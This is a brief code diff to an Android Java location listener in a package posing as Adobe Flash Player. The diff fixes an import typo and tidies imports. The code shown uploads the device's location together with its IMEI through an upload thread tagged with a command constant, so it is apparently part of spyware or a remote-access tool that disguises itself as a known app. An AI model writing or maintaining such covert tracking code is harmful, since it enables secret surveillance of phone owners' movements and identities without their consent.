@@ -9,11 +9,8 @@ import android.os.Bundle;
 import android.util.Log;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
-import com.adobe.flashplayer.MyLog;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
-import com.adobe.flashplayer.Utils;
-
 
 
 public class PhoneLocationListener implements LocationListener{
@@ -68,7 +65,7 @@ public class PhoneLocationListener implements LocationListener{
             JSONArray jsarray=new JSONArray();
 
             jsarray.put(0,objloc);
-            if (NetworkUitls.isNetworkAvailable(context)) {
+            if (NetworkUtils.isNetworkAvailable(context)) {
                 new Thread(new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_LOCATION, Public.IMEI)).start();
             }else{
 
